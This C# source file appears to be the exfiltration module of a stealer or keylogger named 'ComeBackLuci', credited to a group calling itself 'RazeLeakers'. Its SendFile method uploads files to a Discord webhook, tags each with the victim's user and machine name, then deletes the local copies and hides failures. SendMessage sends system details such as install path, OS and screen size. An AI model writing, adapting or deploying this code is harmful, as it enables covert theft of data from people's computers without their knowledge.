using System;
using System.IO;
using System.IO.Compression;
using System.Windows.Forms;
using Discord;
using Discord.Webhook;

namespace ComeBackLuci
{
    public static class ClientManager
    {
        private const string AUTHOR = "M3RFR3T";
        private const string USERNAME = "ComeBackLuci";
        private const string CREDIT = "github.com/RazeLeakers";
        private const string AVATAR_URL = "https://avatars.githubusercontent.com/u/154272786?s=200&v=4";

        public static async void SendFile(string fileSend)
        {
            if (!File.Exists(fileSend)) return;

            string webhook = SettingsManager.Webhook;

            if (webhook == string.Empty) return;

            string errorDir = SettingsManager.ErrorDir;

            if (!Directory.Exists(errorDir))
            {
                string tempPath = Path.Combine(Path.GetTempPath(), "CBL_Error");

                Directory.CreateDirectory(tempPath);

                errorDir = tempPath;
            }

            try
            {
                using (DiscordWebhookClient client = new DiscordWebhookClient(webhook))
                {
                    var errorFiles = Directory.GetFiles(errorDir);

                    if (errorFiles.Length > 0)
                    {
                        string zipSend = Path.Combine(Path.GetTempPath(), "cbl.zip");

                        try
                        {
                            ZipFile.CreateFromDirectory(errorDir, zipSend);

                            await client.SendFileAsync(zipSend, $"**Error ({errorFiles.Length})**", false, null, USERNAME, AVATAR_URL);

                            foreach (var file in errorFiles) File.Delete(file);
                        }
                        catch { }
                        finally { if (File.Exists(zipSend)) File.Delete(zipSend); }
                    }

                    await client.SendFileAsync(fileSend, $"**{Environment.UserName} - {Environment.MachineName}**", false, null, USERNAME, AVATAR_URL);

                    File.Delete(fileSend);
                }
            }
            catch { File.Move(fileSend, Path.Combine(errorDir, Path.GetFileName(fileSend))); }
        }

        public static async void SendMessage(string webhook)
        {
            if (string.IsNullOrWhiteSpace(webhook) || !webhook.Contains("https://discord.com/api/webhooks/")) return;

            EmbedBuilder eb = new EmbedBuilder();
            eb.WithColor(Color.Green);
            eb.AddField("Install path:", $"{Application.StartupPath}");
            eb.AddField("OS:", $"{Environment.OSVersion}");
            eb.AddField("User:", $"{Environment.UserName}");
            eb.AddField("Machine:", $"{Environment.MachineName}");
            eb.AddField("Processor: ", $"{Environment.ProcessorCount}");
            eb.AddField("Screen: ", $"{Screen.PrimaryScreen.Bounds.Size.Width} x {Screen.PrimaryScreen.Bounds.Size.Height}");
            eb.WithFooter($"{CREDIT} | {AUTHOR}");

            try
            {
                using (DiscordWebhookClient client = new DiscordWebhookClient(webhook))
                {
                    await client.SendMessageAsync(null, false, embeds: new Embed[] { eb.Build() }, USERNAME, AVATAR_URL);
                }

                MessageBox.Show("Send!", USERNAME, MessageBoxButtons.OK, MessageBoxIcon.Information);
            }
            catch (Exception ex)
            {
                MessageBox.Show($"Error: {ex.Message}", USERNAME, MessageBoxButtons.OK, MessageBoxIcon.Warning);
            }
        }
    }
}
